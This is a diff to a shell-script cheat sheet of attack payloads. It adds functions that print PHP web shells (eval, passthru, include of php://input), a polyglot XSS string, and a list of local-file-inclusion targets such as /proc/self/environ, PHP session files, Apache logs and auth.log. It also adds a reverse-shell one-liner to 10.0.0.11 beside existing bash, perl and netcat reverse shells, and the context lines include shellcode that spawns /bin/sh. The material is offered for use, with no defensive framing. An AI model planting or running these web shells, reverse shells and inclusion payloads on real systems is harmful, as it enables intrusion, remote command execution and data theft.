@@ -156,11 +156,53 @@ shellcode()
     echo "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
 }
 
+quote()
+{
+    python -c "print __import__('urllib').quote('$1')"
+}
+
 webshell()
 {
-    echo "<?php \$_GET[a]($_GET[b]);?>"
-    echo "<?php eval(\$_POST[c]);?>"
-    echo "<?php passthru(\$_POST[1])?>"
+    echo "<?php \$_GET[a](\$_GET[b]);?>"
+    echo "<?php @eval(\$_POST[c]);?>"
+    echo "<?php @passthru(\$_POST[1])?>"
+    echo "<?php @extract(\$_REQUEST); @die( \$ctime(\$atime) ); ?>"
+    echo "<?php @include 'php://input'; ?>"
+    echo "<?php (\$_=@\$_GET[2]).@\$_(\$_POST[1]) ?>"
+}
+
+xss()
+{
+    echo "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";
+    alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//--
+    ></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>"
+}
+
+lfi()
+{
+   echo "php://input"
+   echo "php://filter/convert.base64-encode/resource="
+   echo "/proc/self/environ"
+   echo "/proc/self/cmdline"
+   echo "/proc/self/fd/x"
+   echo "/tmp/sess_"
+   echo "/var/lib/php5/sess_"
+   echo "/var/log/apache2/access.log"
+   echo "/var/log/apache2/access_log"
+   echo "/var/log/apache2/error.log"
+   echo "/var/log/apache2/error_log"
+   echo "/etc/httpd/logs/acces_log"
+   echo "/etc/httpd/logs/acces.log"
+   echo "/etc/httpd/logs/error_log"
+   echo "/etc/httpd/logs/error.log"
+   echo "/var/www/logs/access_log"
+   echo "/var/www/logs/access.log"
+   echo "/var/www/logs/error_log"
+   echo "/var/www/logs/error.log"
+   echo "/var/log/error_log"
+   echo "/var/log/error.log"
+   echo "/var/log/auth.log"
+   echo "Apache defaut path: http://wiki.apache.org/httpd/DistrosDefaultLayout"
 }
 
 rshell()
@@ -169,6 +211,7 @@ rshell()
     echo "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
     echo "perl -e \"use Socket;$i='10.0.0.1';$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};' }\""
     echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"
+    echo "script -qc 'bash -i' /dev/null &>/dev/tcp/10.0.0.11/1234 <&1"
 }
 
 rsa-public()
